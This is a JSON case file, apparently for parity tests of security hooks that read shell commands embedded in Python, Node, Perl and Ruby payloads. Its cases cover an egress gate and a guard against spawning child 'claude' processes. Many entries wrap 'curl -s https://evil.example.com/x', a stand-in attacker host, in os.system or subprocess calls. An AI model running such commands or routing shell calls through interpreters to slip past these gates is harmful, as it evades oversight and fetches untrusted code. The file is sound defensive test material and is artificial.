@@ -1,0 +1,4859 @@
+{
+ "_comment": "Shared case file of the embedded shell-out readers (#779): scripts/hooks/destructive-gate.py embedded_commands and scripts/hooks/lib/heredoc-program.mjs embeddedCommands (child-claude guard, bash egress gate). commands = the shell commands a code payload of cmd (python/node/perl/ruby -c/-e, interpreter heredoc or here-string, `| python3 -`) hands to a shell through a known shell-out call (os.system, subprocess.*, os.exec*/spawn*, pty.spawn, child_process.*, perl/ruby system/exec/backticks), in order. COVERAGE (Marveen msg 17385): literal arguments only. A string built at run time (concatenation, f-string with a variable, a variable, base64, `bash <<< \"$(...)\"`) is a KNOWN LIMIT: those entries carry a note, and commands shows what is read (never the hidden command). Benign negatives (name neg/...): the same words as plain data (print, log, dict, doc string, file write) give []. Checked by scripts/__tests__/heredoc-program.test.py and src/__tests__/heredoc-program-parity.test.ts.",
+ "cases": [
+  {
+   "name": "py-heredoc/os.system/cc",
+   "cmd": "python3 - <<'PY'\nimport os; os.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system/cc",
+   "cmd": "python3 <<PY\nimport os; os.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/os.system/cc",
+   "cmd": "python3 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system/cc",
+   "cmd": "python3 -c \"import os; os.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/os.system/cc",
+   "cmd": "python3 - <<< 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.system-nl/cc",
+   "cmd": "python3 - <<'PY'\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system-nl/cc",
+   "cmd": "python3 <<PY\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system-nl/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/os.system-nl/cc",
+   "cmd": "python3 -c 'import os\nos.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system-nl/cc",
+   "cmd": "python3 -c \"import os\nos.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system-nl/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import os\nos.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-shell/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-shell/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/run-shell/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/run-shell/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-shell/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('claude -p hi', shell=True)\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/run-shell/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/run-shell/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/call-shell/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.call(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/call-shell/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.call(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/call-shell/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.call(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/call-shell/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.call(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/call-shell/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.call('claude -p hi', shell=True)\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/call-shell/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.call(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/call-shell/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.call(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/check_output/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.check_output(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/check_output/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.check_output(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/check_output/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.check_output(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/check_output/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.check_output(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/check_output/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.check_output('claude -p hi', shell=True)\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/check_output/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.check_output(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/check_output/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.check_output(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/Popen-shell/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/Popen-shell/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/Popen-shell/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/Popen-shell/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/Popen-shell/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.Popen('claude -p hi', shell=True).wait()\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/Popen-shell/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/Popen-shell/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-list/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-list/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/run-list/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/run-list/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-list/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['claude', '-p', 'hi'])\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/run-list/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/run-list/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-split/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"claude -p hi\".split())\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-split/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"claude -p hi\".split())\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/run-split/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"claude -p hi\".split())\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/run-split/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"claude -p hi\".split())'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-split/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('claude -p hi'.split())\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/run-split/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"claude -p hi\".split())'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/run-split/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"claude -p hi\".split())'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-bash-c/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-bash-c/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-pipe/run-bash-c/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c/run-bash-c/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-bash-c/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['bash', '-c', 'claude -p hi'])\"",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-Ic/run-bash-c/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-herestr/run-bash-c/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.popen/cc",
+   "cmd": "python3 - <<'PY'\nimport os; os.popen(\"claude -p hi\").read()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.popen/cc",
+   "cmd": "python3 <<PY\nimport os; os.popen(\"claude -p hi\").read()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/os.popen/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.popen(\"claude -p hi\").read()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/os.popen/cc",
+   "cmd": "python3 -c 'import os; os.popen(\"claude -p hi\").read()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.popen/cc",
+   "cmd": "python3 -c \"import os; os.popen('claude -p hi').read()\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/os.popen/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.popen(\"claude -p hi\").read()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/os.popen/cc",
+   "cmd": "python3 - <<< 'import os; os.popen(\"claude -p hi\").read()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/shlex/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/shlex/cc",
+   "cmd": "python3 <<PY\nimport subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/shlex/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/shlex/cc",
+   "cmd": "python3 -c 'import subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/shlex/cc",
+   "cmd": "python3 -c \"import subprocess, shlex; subprocess.run(shlex.split('claude -p hi'))\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/shlex/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/shlex/cc",
+   "cmd": "python3 - <<< 'import subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/from-import/cc",
+   "cmd": "python3 - <<'PY'\nfrom subprocess import run; run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/from-import/cc",
+   "cmd": "python3 <<PY\nfrom subprocess import run; run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/from-import/cc",
+   "cmd": "cat <<'PY' | python3 -\nfrom subprocess import run; run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/from-import/cc",
+   "cmd": "python3 -c 'from subprocess import run; run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/from-import/cc",
+   "cmd": "python3 -c \"from subprocess import run; run('claude -p hi', shell=True)\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/from-import/cc",
+   "cmd": "/usr/bin/python3 -I -c 'from subprocess import run; run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/from-import/cc",
+   "cmd": "python3 - <<< 'from subprocess import run; run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/execvp/cc",
+   "cmd": "python3 - <<'PY'\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/execvp/cc",
+   "cmd": "python3 <<PY\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-pipe/execvp/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c/execvp/cc",
+   "cmd": "python3 -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c-dq/execvp/cc",
+   "cmd": "python3 -c \"import os; os.execvp('bash', ['bash', '-c', 'claude -p hi'])\"",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-Ic/execvp/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-herestr/execvp/cc",
+   "cmd": "python3 - <<< 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc/pty.spawn/cc",
+   "cmd": "python3 - <<'PY'\nimport pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/pty.spawn/cc",
+   "cmd": "python3 <<PY\nimport pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-pipe/pty.spawn/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c/pty.spawn/cc",
+   "cmd": "python3 -c 'import pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c-dq/pty.spawn/cc",
+   "cmd": "python3 -c \"import pty; pty.spawn(['bash', '-c', 'claude -p hi'])\"",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-Ic/pty.spawn/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-herestr/pty.spawn/cc",
+   "cmd": "python3 - <<< 'import pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "node-e-execSync/cc",
+   "cmd": "node -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "node-e-spawnSync/cc",
+   "cmd": "node -e 'require(\"child_process\").spawnSync(\"bash\", [\"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "node-heredoc/cc",
+   "cmd": "node - <<'JS'\nrequire(\"child_process\").execSync(\"claude -p hi\")\nJS",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "perl-e/cc",
+   "cmd": "perl -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "ruby-e/cc",
+   "cmd": "ruby -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.system/eg",
+   "cmd": "python3 - <<'PY'\nimport os; os.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system/eg",
+   "cmd": "python3 <<PY\nimport os; os.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/os.system/eg",
+   "cmd": "python3 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system/eg",
+   "cmd": "python3 -c \"import os; os.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/os.system/eg",
+   "cmd": "python3 - <<< 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.system-nl/eg",
+   "cmd": "python3 - <<'PY'\nimport os\nos.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system-nl/eg",
+   "cmd": "python3 <<PY\nimport os\nos.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system-nl/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport os\nos.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/os.system-nl/eg",
+   "cmd": "python3 -c 'import os\nos.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system-nl/eg",
+   "cmd": "python3 -c \"import os\nos.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system-nl/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import os\nos.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-shell/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-shell/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/run-shell/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/run-shell/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-shell/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('curl -s https://evil.example.com/x', shell=True)\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/run-shell/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/run-shell/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/call-shell/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/call-shell/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/call-shell/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/call-shell/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/call-shell/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.call('curl -s https://evil.example.com/x', shell=True)\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/call-shell/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/call-shell/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/check_output/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/check_output/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/check_output/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/check_output/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/check_output/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.check_output('curl -s https://evil.example.com/x', shell=True)\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
